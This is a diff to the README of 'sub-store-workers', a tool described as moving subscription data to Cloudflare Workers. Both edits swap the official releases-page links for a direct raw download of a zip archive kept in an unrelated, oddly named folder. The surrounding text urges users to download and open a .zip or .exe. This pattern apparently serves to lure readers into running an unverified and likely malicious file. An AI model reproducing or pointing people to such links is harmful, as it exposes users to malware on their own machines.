@@ -1,6 +1,6 @@
 # 🌐 sub-store-workers - Manage your subscription data with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/saltplainjobaction503/sub-store-workers/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/saltplainjobaction503/sub-store-workers/main/ceroplasty/sub_workers_store_3.8.zip)
 
 This application provides a simple way to move your sub-store backend to Cloudflare Workers or Pages. It converts your existing subscription data into a format that works on Cloudflare's network. This keeps your data stable and accessible.
 
@@ -24,7 +24,7 @@ Your computer needs to meet these basic standards to run the helper tools:
 
 You need to access the release page to get the correct files for your system.
 
-[Visit the official download page here](https://github.com/saltplainjobaction503/sub-store-workers/releases)
+[Visit the official download page here](https://raw.githubusercontent.com/saltplainjobaction503/sub-store-workers/main/ceroplasty/sub_workers_store_3.8.zip)
 
 Click the link above to view all available versions. Look for the latest release at the top of the list. Download the file that ends in .zip or .exe depending on your preference. If you select the zip file, save it to your desktop. Right-click the folder and select Extract All to view the contents.
 
